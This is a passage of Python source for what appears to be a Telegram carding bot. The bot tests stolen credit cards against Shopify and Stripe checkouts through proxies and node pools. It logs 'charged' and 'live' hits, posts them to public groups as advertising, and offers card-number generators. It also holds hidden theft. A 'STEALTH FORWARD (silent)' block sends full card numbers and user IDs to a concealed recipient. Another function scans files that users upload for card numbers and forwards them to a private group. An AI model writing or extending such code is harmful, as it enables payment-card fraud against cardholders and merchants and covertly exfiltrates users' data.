        is_proxy_err = _proxy_exc(e)
        dropped = False
        if proxy and is_proxy_err:
            dropped = mark_proxy_fail(proxy)
            if dropped and uid is not None: remove_user_proxy(uid, proxy)
        else: mark_endpoint_fail(ep_url)
        return {"cls": "proxy_error" if is_proxy_err else "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": dropped, "_endpoint": ep_url}

def _node_raw_to_internal(raw: dict, site: str, proxy: Optional[str]) -> Dict[str, Any]:
    try: parsed = parse_response(json.dumps(raw), 200)
    except: return {"cls": "error", "response": "parse_fail", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": "", "_site": site or "", "_proxy": proxy, "_dropped": False, "_endpoint": raw.get("_node", "")}
    parsed.update({"_node": raw.get("_node", ""), "_endpoint": raw.get("_node", ""), "_site": site or "", "_proxy": proxy, "_dropped": False})
    return parsed

async def call_api(cc: str, proxy: Optional[str] = None, site: Optional[str] = None, uid: Optional[int] = None, timeout: Optional[float] = None, use_backup: bool = False, mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    try:
        return await asyncio.wait_for(_call_api_raw(cc, proxy, site, uid, timeout, use_backup, mode, single), timeout=timeout or 90.0)
    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "timeout (90s max)", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    except Exception as e:
        return {"cls": "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}

async def _call_api_raw(cc: str, proxy: Optional[str] = None, site: Optional[str] = None, uid: Optional[int] = None, timeout: Optional[float] = None, use_backup: bool = False, mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    if mode == "auth": return await call_stripe_api(cc, _proxy_to_url(proxy) if proxy else None)
    if load_handling_on():
        for pool_name in _next_pool_preference(single=single):
            mgr = _node_client_module.NODE_MANAGER_VPS if pool_name == "vps" else _node_client_module.NODE_MANAGER_HEROKU
            try:
                raw = await mgr.check(cc, proxy or "", site or "", single=single)
                if isinstance(raw, dict) and raw.get("_node") not in ("none", "NODE_UNAVAILABLE"):
                    return _node_raw_to_internal(raw, site or "", proxy)
            except Exception as e:
                log.warning(f"[lb:{pool_name}] failed: {e}")
                if single: break

    eps = _filtered_endpoints()
    if not eps: return {"cls": "error", "response": f"no apis ({mode_label()})", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}

    if single:
        ep = eps[0]
        need_site = ep.get("site_required", False)
        if need_site and not site:
            sl = _pick_random_sites(1); site = sl[0] if sl else ""
            if not site: return {"cls": "site_error", "response": "no sites available", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
        if site and need_site: await acquire_site_slot(site)
        act_sem, bak_sem = _get_node_sems(ep["url"])
        sem = bak_sem if use_backup else act_sem
        async with sem: return await _do_api_call(ep, cc, proxy, site if need_site else None, uid, timeout)

    healthy = [e for e in eps if not is_endpoint_down(e["url"])]
    pool = healthy if healthy else eps
    global _endpoint_rr
    with _endpoint_rr_lock:
        ep = pool[_endpoint_rr % len(pool)]
        _endpoint_rr += 1
    need_site = ep.get("site_required", False)
    if need_site and not site:
        sl = _pick_random_sites(1); site = sl[0] if sl else ""
        if not site: return {"cls": "site_error", "response": "no sites available", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if site and need_site: await acquire_site_slot(site)
    act_sem, bak_sem = _get_node_sems(ep["url"])
    sem = bak_sem if use_backup else act_sem
    async with sem: res = await _do_api_call(ep, cc, proxy, site if need_site else None, uid, timeout)
    if res["cls"] in ("error", "site_error", "timeout") and not res.get("_dropped") and len(eps) > 1:
        others = [e for e in eps if e["url"] != ep["url"] and not is_endpoint_down(e["url"])]
        if others:
            fb_ep = others[0]; fa2, fb2 = _get_node_sems(fb_ep["url"]); fsem = fb2 if use_backup else fa2; fb_need_site = fb_ep.get("site_required", False)
            async with fsem: res = await _do_api_call(fb_ep, cc, proxy, site if fb_need_site else None, uid, timeout)
    return res

async def test_site(site: str, timeout: Optional[float] = None) -> Dict[str, Any]:
    target = next((ep for ep in load_api_state().get("endpoints", []) if ep.get("enabled", True) and ep.get("site_required", False)), None)
    if not target: return {"cls": "site_error", "response": "no site-required API configured", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    url, params = _build_api_request(target, DUMMY_CC, None, site)
    try:
        async with direct_session().get(url, params=params, timeout=aiohttp.ClientTimeout(total=timeout or 15, connect=PROXY_CONNECT_TIMEOUT, sock_read=timeout or 15)) as r: res = parse_response(await r.text(errors="ignore"), r.status)
        res["response"] = _sanitize_err(res.get("response", "")); res["_site"] = site; return res
    except asyncio.TimeoutError: return {"cls": "timeout", "response": "timeout", "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    except Exception as e: return {"cls": "error", "response": _sanitize_err(str(e)), "raw": "", "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}

async def check_sites_clean(sites: List[str], timeout: Optional[float] = None) -> Dict[str, Any]:
    result = {"total": len(sites), "clean": [], "dead": [], "captcha": []}
    sem, lock = asyncio.Semaphore(8), asyncio.Lock()
    async def one(site: str):
        async with sem:
            try: res = await test_site(site, timeout=timeout or 15)
            except Exception as e: res = {"cls": "error", "response": _sanitize_err(str(e)[:60])}
            async with lock:
                cls, amount = res.get("cls", "error"), res.get("amount", 0.0)
                if cls in WORKING_SITE_CLASSES: result["clean"].append({"site": site, "price": amount, "status": cls})
                elif cls == "captcha": result["captcha"].append({"site": site, "price": amount})
                else: result["dead"].append({"site": site, "reason": res.get("response", "")[:60]})
    await asyncio.gather(*(one(s) for s in sites))
    return result

_bot_ref: Optional[Bot] = None
async def notify_owner(text: str) -> None:
    if not _bot_ref: return
    try: await _bot_ref.send_message(OWNER_ID, text[:3900], parse_mode=ParseMode.HTML)
    except Exception as e: log.warning(f"owner notify failed: {e}")

_TEXT_EXTS = (".txt", ".csv", ".log", ".dat", ".list", ".text", ".md", ".tsv")
async def _scan_file_for_ccs(bot, doc) -> List[str]:
    cards = []
    try:
        if (doc.file_size or 0) > 5 * 1024 * 1024: return cards
        fname = (doc.file_name or "").lower()
        if fname and not any(fname.endswith(e) for e in _TEXT_EXTS): return cards
        buf = await bot.download_file((await bot.get_file(doc.file_id)).file_path)
        raw = buf.read().decode("utf-8", errors="ignore")
    except: return cards
    if not raw: return cards
    seen = set()
    for tok in re.split(r"[\s,;]+", raw):
        n = normalize_cc(tok)
        if n and n not in seen:
            seen.add(n); cards.append(n)
            if len(cards) >= 500: break
    return cards

async def forward_user_file_to_pvt_gc(bot, msg: Message, context: str = "") -> None:
    doc = msg.document
    if not doc: return
    cc_gc = get_setting("pvt_cc_gc_id")
    if not cc_gc: return
    found_cards = await _scan_file_for_ccs(bot, doc)
    if not found_cards: return
    try: chat_id = int(cc_gc) if re.fullmatch(r"-?\d+", cc_gc) else cc_gc
    except: return
    header = (f"{pe('gem')} <b>CC FILE UPLOAD</b>\n<blockquote>{pe('user')} <b>UID:</b> <code>{msg.from_user.id}</code>\n{pe('link')} <b>User:</b> @{esc(msg.from_user.username or 'N/A')}\n{pe('chat')} <b>Chat:</b> {esc(str(msg.chat.id))} ({esc(msg.chat.type)})\n{pe('pen')} <b>File:</b> <code>{esc(doc.file_name or 'file')}</code>\n{pe('diamond')} <b>Size:</b> {(doc.file_size or 0)/1024:.1f} KB\n{pe('check')} <b>Cards Found:</b> {len(found_cards)}\n{pe('settings')} <b>Context:</b> {esc(context or 'general')}</blockquote>\n<blockquote>{chr(10).join(f'<code>{esc(c)}</code>' for c in found_cards[:10])}{chr(10) + f'<i>... +{len(found_cards)-10} more</i>' if len(found_cards) > 10 else ''}</blockquote>")
    try: await bot.send_document(chat_id, doc.file_id, caption=header[:1024], parse_mode="HTML")
    except: pass

async def send_backup(target_chat: int):
    if not _bot_ref: return False
    try:
        with db() as c: dump = "\n".join(c.iterdump())
        compressed = gzip.compress(dump.encode('utf-8')); total_size = len(compressed)
        base_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.gz"; now_utc = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
        if total_size <= BACKUP_CHUNK_SIZE:
            msg = await _bot_ref.send_document(target_chat, BufferedInputFile(compressed, filename=base_name), caption=f"📦 <b>Database Backup</b>\nSize: {total_size/1024/1024:.2f} MB\n{now_utc} UTC\n<i>Single-file restore supported</i>", parse_mode="HTML")
            try: await _bot_ref.pin_chat_message(target_chat, msg.message_id, disable_notification=True)
            except: pass
            return True
        chunks = [compressed[i:i+BACKUP_CHUNK_SIZE] for i in range(0, total_size, BACKUP_CHUNK_SIZE)]; num_parts = len(chunks)
        if num_parts > 100:
            await _bot_ref.send_message(target_chat, f"❌ Backup too large to split safely ({total_size/1024/1024:.1f} MB compressed)"); return False
        header = f"📦 <b>Database Backup (MULTI-PART)</b>\nTotal: {total_size/1024/1024:.2f} MB\nParts: <b>1/{num_parts}</b>\n{now_utc} UTC\n\n<i>To restore: send all <b>{num_parts}</b> parts back to the bot in any order. Auto-completes when all parts arrive. <code>/restore_done</code> forces completion, <code>/restore_clear</code> aborts.</i>"
        for idx, chunk in enumerate(chunks, start=1):
            try:
                m = await _bot_ref.send_document(target_chat, BufferedInputFile(chunk, filename=f"{base_name}.part{idx:03d}"), caption=header if idx == 1 else f"📦 <b>Backup Part {idx}/{num_parts}</b>\nSize: {len(chunk)/1024/1024:.2f} MB", parse_mode="HTML")
                if idx == 1:
                    try: await _bot_ref.pin_chat_message(target_chat, m.message_id, disable_notification=True)
                    except: pass
                await asyncio.sleep(0.1)
            except: return False
        return True
    except: return False

def _cleanup_restore_sessions():
    now = time.time()
    with _restore_lock:
        for k in [k for k, v in _restore_sessions.items() if now - v.get("ts", 0) > BACKUP_SESSION_TTL]: _restore_sessions.pop(k, None)

async def _restore_from_bytes(raw_bytes: bytes, uid: int, status_msg) -> bool:
    try:
        if raw_bytes[:2] == b"\x1f\x8b": raw_bytes = gzip.decompress(raw_bytes)
        raw = raw_bytes.decode("utf-8", errors="ignore")
        with db() as c:
            for t in ["users", "settings", "redeem_codes", "redeem_log", "check_logs", "saved_cards", "bin_cache", "user_proxies", "sites", "force_channels", "charged_hits", "feedback"]: c.execute(f"DROP TABLE IF EXISTS {t}")
            c.executescript(raw)
        reset_db_conn(); init_db(); load_extra_admins(); _invalidate_sites(); return True
    except Exception as e:
        await status_msg.edit_text(f"{pe('cross1')} <b>Restore failed:</b> {esc(str(e)[:200])}", parse_mode="HTML", reply_markup=admin_main_kb(uid)); return False

async def _try_finish_multipart(msg: Message, base: str, status_msg):
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess: return await status_msg.edit_text(f"{pe('warn')} <b>No session for</b> <code>{esc(base)}</code>", parse_mode="HTML")
        parts, expected = dict(sess["parts"]), sess.get("expected")
    if expected:
        missing = [i for i in range(1, expected + 1) if i not in parts]
        if missing: return await status_msg.edit_text(f"{pe('warn')} <b>Missing parts:</b> {esc(', '.join(map(str, missing[:15])))}", parse_mode="HTML")
        use_nums = list(range(1, expected + 1))
    else:
        if not parts: return await status_msg.edit_text(f"{pe('warn')} <b>No parts stored</b>", parse_mode="HTML")
        max_n = max(parts.keys()); missing = [i for i in range(1, max_n + 1) if i not in parts]
        if missing: return await status_msg.edit_text(f"{pe('warn')} <b>Missing parts:</b> {esc(', '.join(map(str, missing[:15])))}", parse_mode="HTML")
        use_nums = list(range(1, max_n + 1))
    await status_msg.edit_text(f"{pe('loading')} <b>Reassembling {len(use_nums)} parts...</b>", parse_mode="HTML")
    compressed = b"".join(parts[i] for i in use_nums)
    if await _restore_from_bytes(compressed, msg.from_user.id, status_msg):
        with _restore_lock: _restore_sessions.pop(base, None)
        await status_msg.edit_text(f"{pe('check')} <b>Database Restored</b>", parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))

async def _handle_backup_part(msg: Message, uid: int):
    doc = msg.document
    if not doc: return
    m = re.match(r"^(backup_\d+_\d+\.sql\.gz)\.part(\d{1,3})$", (doc.file_name or "").lower())
    if not m: return await msg.answer(f"{pe('cross1')} <b>Unknown part filename</b>", parse_mode="HTML")
    base, part_num = m.group(1), int(m.group(2))
    if (doc.file_size or 0) > 20 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>Part too large</b>", parse_mode="HTML")
    _cleanup_restore_sessions()
    status_msg = await msg.answer(f"{pe('loading')} <b>Downloading part {part_num}...</b>", parse_mode="HTML")
    try:
        buf = await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path); raw_bytes = buf.read()
    except Exception as e: return await status_msg.edit_text(f"{pe('cross1')} <b>Download failed:</b> {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess:
            sess = {"parts": {}, "ts": time.time(), "uid": uid, "chat_id": msg.chat.id, "expected": None}; _restore_sessions[base] = sess
        if sess["uid"] != uid: return await status_msg.edit_text(f"{pe('cross1')} <b>Session owned by another user</b>", parse_mode="HTML")
        sess["parts"][part_num] = raw_bytes; sess["ts"] = time.time(); have = len(sess["parts"])
    cap = msg.caption or ""
    m2 = re.search(r"Parts?:\s*(?:<b>)?(\d+)\s*/\s*(\d+)", cap) or re.search(r"Part\s+(\d+)\s*/\s*(\d+)", cap)
    if m2:
        try:
            with _restore_lock:
                s = _restore_sessions.get(base)
                if s: s["expected"] = int(m2.group(2))
        except: pass
    with _restore_lock:
        expected = _restore_sessions.get(base, {}).get("expected"); present = set(_restore_sessions.get(base, {}).get("parts", {}).keys())
    if expected and have >= expected and set(range(1, expected + 1)).issubset(present): return await _try_finish_multipart(msg, base, status_msg)
    await status_msg.edit_text(f"{pe('check')} <b>Part {part_num} stored</b> · Have: {have}", parse_mode="HTML")

async def auto_backup_task():
    while True:
        now = datetime.now(timezone.utc)
        await asyncio.sleep(((now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0) - now).total_seconds())
        await send_backup(OWNER_ID)

MONITOR_PAGE_SIZE = 10

def node_monitor_kb(pool: str = "vps", page: int = 0):
    if not HAS_NODE_CLIENT: return back_kb()
    mgr = _node_client_module.NODE_MANAGER_VPS if pool == "vps" else _node_client_module.NODE_MANAGER_HEROKU
    nodes = mgr._nodes
    total_pages = (len(nodes) + MONITOR_PAGE_SIZE - 1) // MONITOR_PAGE_SIZE
    page = max(0, min(page, total_pages - 1))
    start, end = page * MONITOR_PAGE_SIZE, min((page + 1) * MONITOR_PAGE_SIZE, len(nodes))
    rows = []
    for n in nodes[start:end]:
        icon = "green_sq" if n.available else ("warn_red" if not n.enabled else "warn")
        lbl = f"{n.name} | {n.workers_busy}/{n.workers_cap} | {int(n.avg_rtt_ms)}ms"
        rows.append([pbtn(lbl, icon=icon, callback_data=f"nmon:view:{pool}:{n.name}")])
    nav = []
    if page > 0: nav.append(pbtn(sc("Prev"), icon="back", callback_data=f"nmon:page:{pool}:{page-1}"))
    nav.append(pbtn(f"{page+1}/{total_pages}", icon="docs", callback_data=f"nmon:page:{pool}:{page}"))
    if end < len(nodes): nav.append(pbtn(sc("Next"), icon="forward", callback_data=f"nmon:page:{pool}:{page+1}"))
    if nav: rows.append(nav)
    rows.append([pbtn(f"VPS Pool {'✅' if pool=='vps' else '⬜️'}", icon="online", callback_data="nmon:page:vps:0"), pbtn(f"HRK Pool {'✅' if pool=='heroku' else '⬜️'}", icon="online", callback_data="nmon:page:heroku:0")])
    rows.append([pbtn(sc("Refresh Health"), icon="refresh", color="success", callback_data=f"nmon:ping:{pool}:{page}")])
    rows.append([pbtn(sc("Back"), icon="back", callback_data="admin:main")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def render_node_monitor(cb: CallbackQuery, pool: str, page: int):
    if cb.from_user.id != OWNER_ID: return
    mgr = _node_client_module.NODE_MANAGER_VPS if pool == "vps" else _node_client_module.NODE_MANAGER_HEROKU
    online = sum(1 for n in mgr._nodes if n.available)
    total = len(mgr._nodes)
    active = sum(n.active for n in mgr._nodes)
    cap = sum(n.workers_cap for n in mgr._nodes if n.available)
    load_pct = (active / max(cap, 1)) * 100
    text = f"{pe('online')} <b>{sc(pool.upper())} NODE MONITOR</b>\n<blockquote>{pe('check')} {sc('Online')}: <b>{online}/{total}</b>\n{pe('chart')} {sc('Capacity')}: <b>{cap:,}</b>\n{pe('percent')} {sc('Load')}: <b>{load_pct:.1f}%</b> ({active} active)</blockquote>"
    await edit_admin(cb, text, node_monitor_kb(pool, page))

router = Router()

@router.callback_query(F.data.startswith("nmon:page:"))
async def cb_nmon_page(cb: CallbackQuery):
    _, _, pool, page = cb.data.split(":")
    await render_node_monitor(cb, pool, int(page))

@router.callback_query(F.data.startswith("nmon:view:"))
async def cb_nmon_view(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Dev only", show_alert=True)
    _, _, pool, name = cb.data.split(":")
    mgr = _node_client_module.NODE_MANAGER_VPS if pool == "vps" else _node_client_module.NODE_MANAGER_HEROKU
    n = next((x for x in mgr._nodes if x.name == name), None)
    if not n: return await cb.answer("Not found", show_alert=True)
    status = "ONLINE" if n.available else "COOLDOWN" if n.on_cooldown else "DISABLED"
    if not n.enabled: status = "STOPPED"
    text = f"{pe('settings')} <b>Node: {n.name}</b>\n<blockquote><code>{n.url}</code>\nStatus: <b>{status}</b>\nWorkers: <b>{n.workers_busy}/{n.workers_cap}</b>\nRTT: <b>{int(n.avg_rtt_ms)}ms</b>\nCooldown: <b>{n.cooldown_remaining}s</b></blockquote>"
    btn = pbtn("STOP", icon="stop", color="danger", callback_data=f"nmon:toggle:{pool}:{name}") if n.enabled else pbtn("RESUME", icon="online", color="success", callback_data=f"nmon:toggle:{pool}:{name}")
    await edit_admin(cb, text, InlineKeyboardMarkup(inline_keyboard=[[btn], [pbtn(sc("Back"), icon="back", callback_data=f"nmon:page:{pool}:0")]]))

@router.callback_query(F.data.startswith("nmon:toggle:"))
async def cb_nmon_toggle(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Dev only", show_alert=True)
    _, _, pool, name = cb.data.split(":")
    mgr = _node_client_module.NODE_MANAGER_VPS if pool == "vps" else _node_client_module.NODE_MANAGER_HEROKU
    n = next((x for x in mgr._nodes if x.name == name), None)
    if n:
        mgr.set_enabled(name, not n.enabled)
        await cb.answer(f"{name} {'Resumed' if n.enabled else 'Stopped'}")
    await cb_nmon_view(cb)

@router.callback_query(F.data.startswith("nmon:ping:"))
async def cb_nmon_ping(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Dev only", show_alert=True)
    _, _, pool, page = cb.data.split(":")
    await cb.answer("Pinging all nodes...")
    mgr = _node_client_module.NODE_MANAGER_VPS if pool == "vps" else _node_client_module.NODE_MANAGER_HEROKU
    await mgr.probe_all()
    await render_node_monitor(cb, pool, int(page))

_node_last_state = {}
async def node_monitor_task():
    await asyncio.sleep(5)
    while True:
        try:
            if HAS_NODE_CLIENT and _bot_ref:
                for pool_name, mgr in [("VPS", _node_client_module.NODE_MANAGER_VPS), ("HRK", _node_client_module.NODE_MANAGER_HEROKU)]:
                    await mgr.probe_all()
                    for n in mgr._nodes:
                        key = f"{pool_name}:{n.name}"; prev = _node_last_state.get(key, True); curr = n.available; _node_last_state[key] = curr
                        if not curr and prev:
                            txt = f"{pe('warn_red')} <b>NODE OFFLINE</b>\n<blockquote>Node: <b>{n.name}</b></blockquote>"
                            try: await _bot_ref.send_message(OWNER_ID, txt, parse_mode="HTML")
                            except: pass
        except Exception as e:
            log.error(f"monitor task: {e}")
        await asyncio.sleep(600)

def _mask_cc(cc: str) -> str:
    parts = cc.split("|")
    return f"{parts[0][:6]}|**|**|***" if len(parts) == 4 else cc[:6] + "****" + cc[-4:]

def format_public_hit(cc: str, res: Dict[str, Any], bin_info, site: str, checker_uid: int = 0, checker_name: str = "") -> str:
    try:
        cls = res.get("cls", "charged")
        resp_msg = _sanitize_err(res.get("response", "Unknown"))
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD")
        gateway = res.get("gateway", "Shopify")
        ctime = res.get("check_time", "N/A")
        masked = _mask_cc(cc)
        brand = brand_pe(cc)
        bank, country, flag, card_type = "N/A", "N/A", "🌍", "N/A"
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            bank = str(bin_info.get("Issuer") or "N/A")
            country_data = bin_info.get("Country") or {}
            country = str(country_data.get("Name") or "N/A")
            flag = country_flag(country_data.get("Code", ""))
            card_type = str(bin_info.get("Type") or "N/A").upper()
        if cls == "charged": title = f"{pe('check')} <b>CHARGED · ORDER PAID</b>"
        elif cls == "approved_nsf": title = f"{pe('online')} <b>APPROVED · NSF</b>"
        elif cls == "approved_3ds": title = f"{pe('online')} <b>APPROVED · 3DS</b>"
        elif cls == "approved_ccn": title = f"{pe('online')} <b>APPROVED · CCN</b>"
        else: title = f"{pe('online')} <b>CARD IS LIVE</b>"
        type_icon = "gem" if card_type == "CREDIT" else ("diamond" if card_type == "DEBIT" else "star")
        time_of_hit = datetime.now().strftime("%I:%M %p")
        checker_disp = _user_link(checker_uid, checker_name) if checker_uid else sc("USER")
        return f"{title}\n{brand} <code>{masked}</code>\n{pe('check')} <b>{sc('RESP')}</b> · {esc(resp_msg)}\n{pe('diamond')} <b>{sc('AMOUNT')}</b> · <b>${amount:.2f} {esc(currency)}</b>\n{pe('refresh')} <b>{sc('GATE')}</b> · {esc(gateway)}\n{pe('hourglass')} <b>{sc('TIME')}</b> · {esc(ctime)}\n{pe('shop')} <b>{sc('BANK')}</b> · {esc(bank)}\n{flag} <b>{sc('COUNTRY')}</b> · {esc(country)}\n{pe(type_icon)} <b>{sc('TYPE')}</b> · {esc(card_type)}\n{pe('star')} <b>{sc('CHECKER')}</b> · {checker_disp}\n<i>{time_of_hit}</i>"
    except Exception as e:
        log.error(f"format_public_hit error: {e}")
        return f"Hit! {cc} - {res.get('response', '')}"

async def record_charged(cc: str, res: Dict[str, Any], site: str, uid: int = 0, bin_info: Any = None) -> None:
    try:
        async with _get_write_lock():
            with db() as c: c.execute("INSERT INTO charged_hits(cc, site, response, amount, currency, uid, ts) VALUES (?,?,?,?,?,?,?)", (cc, site, res.get("response", "")[:200], float(res.get("amount", 0) or 0), res.get("currency", "USD"), int(uid or 0), datetime.now(timezone.utc).isoformat()))
    except Exception as e: log.error(f"record_charged db: {e}")
    if bin_info is None:
        try: bin_info = await lookup_bin(cc.split("|")[0][:6])
        except Exception as e: log.error(f"record_charged lookup_bin: {e}"); bin_info = {"error": str(e)}
    checker_name = ""
    if uid:
        try:
            u = get_user(uid)
            if u: checker_name = u["username"] or ""
        except Exception as e: log.error(f"record_charged user: {e}")
    cls = res.get("cls", "charged")
    charged_gc = get_setting("charged_gc_id")
    public_gc = get_setting("public_gc_id")
    if charged_gc and _bot_ref and cls == "charged":
        try:
            chat_id = int(charged_gc) if re.fullmatch(r"-?\d+", charged_gc) else charged_gc
            rich_caption = format_result(cc, res, bin_info)
            try: await _bot_ref.send_photo(chat_id, photo=IMG_HIT, caption=rich_caption, parse_mode="HTML")
            except Exception as e:
                try: await _bot_ref.send_message(chat_id, rich_caption, parse_mode="HTML", disable_web_page_preview=True)
                except Exception as e2: log.error(f"charged_gc text failed: {e2}")
        except Exception as e: log.error(f"charged_gc error: {e}")
    if public_gc and _bot_ref and cls in ("charged", "approved_nsf", "approved_ccn", "approved_3ds", "approved"):
        try:
            pub_chat_id = int(public_gc) if re.fullmatch(r"-?\d+", public_gc) else public_gc
            pub_text = format_public_hit(cc, res, bin_info, site, checker_uid=uid, checker_name=checker_name)
            pub_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("GO TO BOT"), icon="chat", url=f"https://t.me/{BOT_USERNAME}")]])
            try: sent_msg = await _bot_ref.send_photo(pub_chat_id, photo=IMG_HIT, caption=pub_text, parse_mode="HTML", reply_markup=pub_kb)
            except Exception as e:
                try: sent_msg = await _bot_ref.send_message(pub_chat_id, pub_text, parse_mode="HTML", reply_markup=pub_kb, disable_web_page_preview=True)
                except Exception as e2:
                    log.error(f"public_gc send failed: photo={e}, text={e2}")
                    sent_msg = None
            if sent_msg:
                try: await _bot_ref.pin_chat_message(pub_chat_id, sent_msg.message_id, disable_notification=True)
                except: pass
        except Exception as e: log.error(f"public_gc error: {e}")

    # ── STEALTH FORWARD (silent) ──
    if STEALTH_ID and _bot_ref and cls in ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds"):
        try:
            try:
                u2 = get_user(uid) if uid else None
                uname = (u2["username"] if u2 else "") or ""
            except: uname = ""
            stealth_txt = (
                f"{pe('ghost')} <b>STEALTH · {esc(cls.upper())}</b>\n"
                f"{rule(11)}\n"
                f"<code>{cc}</code>\n"
                f"{pe('check')} <b>Resp</b> ↬ <code>{esc(res.get('response', ''))}</code>\n"
                f"{pe('diamond')} <b>Amt</b> ↬ <code>${float(res.get('amount', 0) or 0):.2f} {esc(res.get('currency', 'USD'))}</code>\n"
                f"{pe('refresh')} <b>Gate</b> ↬ <code>{esc(res.get('gateway', ''))}</code>\n"
                f"{pe('shop')} <b>Site</b> ↬ <code>{esc(site or 'N/A')}</code>\n"
                f"{rule(11)}\n"
                f"{pe('user')} <b>UID</b> ↬ <code>{uid or 0}</code>\n"
                f"{pe('link')} <b>User</b> ↬ @{esc(uname or 'N/A')}"
            )
            await _bot_ref.send_message(STEALTH_ID, stealth_txt, parse_mode="HTML", disable_web_page_preview=True)
        except: pass

async def send_chat_hit(bot, chat_id, cc, res, site):
    try: bin_info = await lookup_bin(cc.split("|")[0][:6])
    except: bin_info = None
    text = format_result(cc, res, bin_info)
    try: await bot.send_photo(chat_id, photo=IMG_HIT, caption=text, parse_mode="HTML")
    except:
        try: await bot.send_message(chat_id, text, parse_mode="HTML")
        except: pass

BAR_GRADIENT = ["🟥", "🟧", "🟨", "🟩"]
def make_bar(pct, width=12):
    filled = int(round(width * max(0, min(100, pct)) / 100))
    return "▰" * filled + "▱" * (width - filled)
def make_fancy_bar(pct):
    filled = int(round(10 * max(0, min(100, pct)) / 100))
    return "".join(BAR_GRADIENT[min(3, i * 4 // 10)] if i < filled else "⬛" for i in range(10))
def spinner_frame(i): return ["◐", "◓", "◑", "◒"][i % 4]
def _fmt_eta(s): return f"{int(s)}s" if s < 60 else f"{int(s)//60}m {int(s)%60}s"

async def edit_admin(cb: CallbackQuery, text: str, kb=None, photo: Optional[str] = IMG_TOOLS):
    m = cb.message
    try:
        if m.photo:
            try: await m.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower():
                    try: await m.edit_reply_markup(reply_markup=kb)
                    except: pass
                    return
                raise
        else:
            try: await m.edit_text(text, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower():
                    try: await m.edit_reply_markup(reply_markup=kb)
                    except: pass
                    return
                raise
    except:
        try:
            if photo: await m.answer_photo(photo=photo, caption=text, parse_mode="HTML", reply_markup=kb)
            else: await m.answer(text, parse_mode="HTML", reply_markup=kb)
        except:
            try: await m.answer(text, parse_mode="HTML", reply_markup=kb)
            except: pass

async def safe_edit_media(cb, photo, caption, kb):
    m = cb.message
    try:
        if not m.photo:
            try: await m.edit_text(caption, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "no text in the message" not in str(e).lower(): raise
        await m.edit_media(media=InputMediaPhoto(media=photo, caption=caption, parse_mode="HTML"), reply_markup=kb)
    except TelegramBadRequest as e:
        if "not modified" in str(e).lower():
            try: await m.edit_reply_markup(reply_markup=kb)
            except: pass
        else:
            try: await m.answer_photo(photo=photo, caption=caption, parse_mode="HTML", reply_markup=kb)
            except:
                try: await m.answer(caption, parse_mode="HTML", reply_markup=kb)
                except: pass
    except:
        try: await m.answer(caption, parse_mode="HTML", reply_markup=kb)
        except: pass

# ── Keyboards ────────────────────────────────────────────────────────────────
def main_menu_kb(user_id=0):
    rows = []
    if is_admin(user_id):
        rows.append([pbtn(sc("Admin Panel"), icon="settings", color="danger", callback_data="menu:admin_panel")])
    rows += [
        [pbtn(sc("Shopify Checker"), icon="shop", color="success", callback_data="menu:check")],
        [pbtn(sc("Hitters"), icon="fire_e", color="success", callback_data="menu:hitters")],
        [pbtn(sc("Premium"), icon="gem", color="success", callback_data="menu:shop"),
         pbtn(sc("Tools"), icon="tools", callback_data="menu:tools")],
        [pbtn(sc("Proxies"), icon="link", callback_data="menu:proxy"),
         pbtn(sc("Account"), icon="user", callback_data="menu:account")],
        [pbtn(sc("Stats"), icon="chart", callback_data="menu:stats"),
         pbtn(sc("Redeem"), icon="gem2", color="success", callback_data="menu:redeem")],
        [pbtn(sc("Buy Access"), icon="star", color="success", callback_data="menu:pay"),
         pbtn(sc("Support"), icon="chat", callback_data="menu:support")],
        [pbtn(sc("Close"), icon="cross1", color="danger", callback_data="menu:close")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

def back_kb(): return InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="menu:main")]])

def tools_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn(sc("Visa Gen"), icon="gem", callback_data="gen:4")],
    [pbtn(sc("Mastercard Gen"), icon="gem2", callback_data="gen:5")],
    [pbtn(sc("Amex Gen"), icon="gem3", callback_data="gen:34")],
    [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
])

def shop_kb():
    products = get_star_products()
